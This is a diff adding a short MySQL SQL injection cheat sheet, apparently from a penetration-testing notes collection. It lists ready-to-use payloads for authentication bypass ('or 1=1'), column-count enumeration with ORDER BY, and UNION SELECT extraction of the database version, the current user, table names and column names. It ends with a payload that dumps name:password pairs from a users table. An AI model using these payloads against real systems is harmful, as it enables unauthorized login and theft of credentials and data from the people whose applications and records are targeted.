@@ -1,0 +1,31 @@
+#mysql injection sql
+
+#Authentication Bypass:
+
+blah' or 1=1 limit 1;#
+blah' or 1=1;#
+
+#Enumeration - Column Count:
+blah' order by 1
+.
+.
+.
+blah' order by n
+
+#Enumeration - Version:
+blah union all select 1,2,3,4,@@version,6
+
+#Enumeration - User:
+blah union all select 1,2,3,4,user(),6
+blah' union all select 1,2,3,4,user(),6
+
+#Enumeration - Table Name:
+blah union all select 1,2,3,4,table_name,6 FROM information_schema.tables
+
+#Enumeration - Column Name:
+blah union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='$NAME_OF_TABLE'
+blah union all select 1,2,3,column_name,5,6 FROM information_schema.columns where table_name='$NAME_OF_TABLE'
+blah union all select 1,2,column_name,4,5,6 FROM information_schema.columns where table_name='$NAME_OF_TABLE'
+
+#Enumeration - Values of two columns of another table (0x3a == ':'):
+blah union all select 1,2,3,4,concat(name,0x3a,password),6 FROM users
